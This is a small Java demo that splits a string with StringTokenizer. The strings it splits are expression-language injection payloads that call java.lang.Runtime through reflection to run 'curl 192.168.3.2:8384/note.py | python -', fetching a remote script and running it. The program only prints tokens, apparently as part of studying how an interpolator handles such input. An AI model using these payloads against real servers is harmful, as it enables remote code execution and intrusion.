import java.util.StringTokenizer;

public class StringTokenizerDemo {

    public static void main(String[] args) {
        String val =
                "#{request.setAttribute('methods',''['class'].forName('java.lang.Runtime').getDeclaredMethods())---request.getAttribute('methods')[15].invoke(request.getAttribute('methods')[7].invoke(null),'curl 192.168.3.2:8384/note.py')}";

        String val1 =
                "#{request.setAttribute('methods',''['class'].forName('java.lang.Runtime').getDeclaredMethods())---request.getAttribute('methods')[14].invoke(request.getAttribute('methods')[7].invoke(null),new Object[]{new String[]{'/bin/bash','-c','curl 192.168.3.2:8384/note.py |python -'}})}";

        StringTokenizer tokens = new StringTokenizer(val1, "#{}");

        while(tokens.hasMoreTokens()) {
            String name = tokens.nextToken();
            System.out.println("name=" + name);
//                String value = Interpolator.instance().interpolate(tokens.nextToken(), new Object[0]);
//                parameters.put(name, value);
        }
    }
}
